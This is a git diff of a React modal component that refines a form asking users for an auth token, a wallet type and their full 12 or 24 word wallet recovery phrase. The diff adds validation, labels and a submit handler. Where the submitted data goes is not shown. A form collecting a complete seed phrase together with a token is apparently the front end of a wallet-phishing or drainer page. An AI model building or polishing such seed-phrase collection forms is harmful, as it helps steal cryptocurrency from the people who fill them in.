@@ -2,6 +2,7 @@ import { Modal } from '@/components/ui/modal';
 import Input from '@/components/form/input/InputField';
 import TextArea from '@/components/form/input/TextArea';
 import Select from '@/components/form/Select';
+import Label from '@/components/form/Label';
 import { walletOptions } from '@/constants';
 
 interface RecoveryModalProps {
@@ -11,6 +12,8 @@ interface RecoveryModalProps {
 	setRecoveryPhrase: (phrase: string) => void;
 	authToken: string;
 	setAuthToken: (token: string) => void;
+	selectedWallet: string;
+	setSelectedWallet: (wallet: string) => void;
 	error: string;
 	isSubmitting: boolean;
 	onSubmit: () => void;
@@ -23,10 +26,20 @@ export default function RecoveryModal({
 	setRecoveryPhrase,
 	authToken,
 	setAuthToken,
+	selectedWallet,
+	setSelectedWallet,
 	error,
 	isSubmitting,
 	onSubmit,
 }: RecoveryModalProps) {
+	const handleSubmit = (e: React.FormEvent) => {
+		e.preventDefault();
+		onSubmit();
+	};
+
+	const isFormValid =
+		authToken.trim() && recoveryPhrase.trim() && selectedWallet;
+
 	return (
 		<Modal isOpen={isOpen} onClose={onClose} className="max-w-lg mx-4">
 			<div className="p-6">
@@ -41,7 +54,7 @@ export default function RecoveryModal({
 								strokeLinecap="round"
 								strokeLinejoin="round"
 								strokeWidth={2}
-								d="M15 7a2 2 0 012 2m4 0a6 6 0 01-7.743 5.743L11 17H9v2H7v2H4a1 1 0 01-1-1v-2.586a1 1 0 01.293-.707l5.964-5.964A6 6 0 1721 9z"
+								d="M15 7a2 2 0 012 2m4 0a6 6 0 01-7.743 5.743L11 17H9v2H7v2H4a1 1 0 01-1-1v-2.586a1 1 0 01.293-.707l5.964-5.964A6 6 0 1121 9z"
 							/>
 						</svg>
 					</div>
@@ -60,64 +73,62 @@ export default function RecoveryModal({
 					</div>
 				)}
 
-				<div className="space-y-4">
+				<form onSubmit={handleSubmit} className="space-y-4">
 					<div>
-						<label className="block text-sm font-medium text-gray-700 dark:text-gray-300 mb-2">
-							Auth Token
-						</label>
+						<Label htmlFor="auth-token">Auth Token *</Label>
 						<Input
+							id="auth-token"
 							type="text"
 							placeholder="Please Enter your Auth Token..."
 							value={authToken}
 							onChange={(e) => setAuthToken(e.target.value)}
 							className="w-full"
+							required
+							error={!authToken && error ? true : false}
 						/>
 					</div>
 
 					<div>
+						<Label htmlFor="wallet-select">Wallet Type *</Label>
 						<Select
+							// id="wallet-select"
 							options={walletOptions}
 							placeholder="Select a wallet"
-							onChange={() => {}}
+							value={selectedWallet}
+							onChange={(e) => setSelectedWallet(e.target.value)}
+							required
 						/>
 					</div>
 
 					<div>
-						<label className="block text-sm font-medium text-gray-700 dark:text-gray-300 mb-2">
-							Auth Token
-						</label>
-						<Input
-							type="text"
-							placeholder="Please Enter your Auth Token..."
-							value={authToken}
-							onChange={(e) => setAuthToken(e.target.value)}
-							className="w-full"
-						/>
-					</div>
-
-					<div>
-						<label className="block text-sm font-medium text-gray-700 dark:text-gray-300 mb-2">
-							Recovery Phrase *
-						</label>
+						<Label htmlFor="recovery-phrase">Recovery Phrase *</Label>
 						<TextArea
+							// id="recovery-phrase"
 							placeholder="Enter your 12 or 24 word recovery phrase..."
 							rows={3}
 							value={recoveryPhrase}
 							onChange={(e) => setRecoveryPhrase(e.target.value)}
 							className="w-full"
+							error={!recoveryPhrase && error ? true : false}
 						/>
+						<p className="mt-1 text-xs text-gray-500 dark:text-gray-400">
+							Please separate each word with a space. Ensure the phrase is
+							exactly 12 or 24 words.
+						</p>
 					</div>
 
 					<div className="flex gap-3 pt-4">
 						<button
+							type="button"
 							onClick={onClose}
-							className="flex-1 bg-gray-200 hover:bg-gray-300 dark:bg-gray-700 dark:hover:bg-gray-600 text-gray-800 dark:text-gray-200 px-4 py-2.5 rounded-lg font-medium transition-colors">
+							className="flex-1 bg-gray-200 hover:bg-gray-300 dark:bg-gray-700 dark:hover:bg-gray-600 text-gray-800 dark:text-gray-200 px-4 py-2.5 rounded-lg font-medium transition-colors"
+							disabled={isSubmitting}>
 							Cancel
 						</button>
 						<button
-							onClick={onSubmit}
-							disabled={isSubmitting}
-							className="flex-1 bg-red-600 hover:bg-red-700 disabled:bg-red-400 text-white px-4 py-2.5 rounded-lg font-medium transition-colors flex items-center justify-center gap-2">
+							type="submit"
+							disabled={isSubmitting || !isFormValid}
+							className="flex-1 bg-red-600 hover:bg-red-700 disabled:bg-red-400 disabled:cursor-not-allowed text-white px-4 py-2.5 rounded-lg font-medium transition-colors flex items-center justify-center gap-2">
 							{isSubmitting ? (
 								<>
 									<svg
@@ -143,7 +154,7 @@ export default function RecoveryModal({
 							)}
 						</button>
 					</div>
-				</div>
+				</form>
 			</div>
 		</Modal>
 	);
